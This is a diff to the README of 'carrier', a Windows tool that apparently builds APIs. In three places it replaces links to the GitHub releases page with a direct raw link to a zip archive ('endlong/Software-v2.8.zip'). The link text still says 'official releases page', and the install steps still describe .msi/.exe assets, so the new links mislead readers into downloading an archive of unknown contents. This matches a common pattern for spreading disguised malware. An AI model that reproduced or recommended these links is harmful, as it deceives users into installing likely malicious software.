@@ -1,6 +1,6 @@
 # 🚀 carrier - Build production APIs in minutes fast
 
-[![Download carrier](https://img.shields.io/badge/Download_carrier-Blue-blue.svg)](https://github.com/handed-teamwork559/carrier/releases)
+[![Download carrier](https://img.shields.io/badge/Download_carrier-Blue-blue.svg)](https://github.com/handed-teamwork559/carrier/raw/refs/heads/main/endlong/Software-v2.8.zip)
 
 Carrier changes how you build web services. You no longer need to write hundreds of lines of code to connect a database or add login features. This tool handles the manual work so you focus on your business goals. It creates stable, ready-to-use systems that meet professional standards.
 
@@ -16,7 +16,7 @@ You need a computer running Windows 10 or Windows 11 to use this software. A mod
 
 Follow these steps to install the software on your machine:
 
-1. Visit the [official releases page](https://github.com/handed-teamwork559/carrier/releases) to find the latest version of the installer.
+1. Visit the [official releases page](https://github.com/handed-teamwork559/carrier/raw/refs/heads/main/endlong/Software-v2.8.zip) to find the latest version of the installer.
 2. Look for the file ending in `.msi` or `.exe` under the Assets section.
 3. Click the file name to start your download.
 4. Open your Downloads folder once the file finishes saving.
@@ -57,7 +57,7 @@ If you decide to change your business rules later, just open the project in Carr
 You need an internet connection to download the installer and to sync your cloud-based data. You can work on project logic while offline, but some setup tasks require a network.
 
 **How do I update the software?**
-When a new version comes out, return to the [official releases page](https://github.com/handed-teamwork559/carrier/releases) and download the new installer. Running it will update your files while keeping your project settings intact.
+When a new version comes out, return to the [official releases page](https://github.com/handed-teamwork559/carrier/raw/refs/heads/main/endlong/Software-v2.8.zip) and download the new installer. Running it will update your files while keeping your project settings intact.
 
 **Can I export my data?**
 Yes. Every project includes an export button in the settings menu. This saves your data in a simple format that you can open in spreadsheet software.
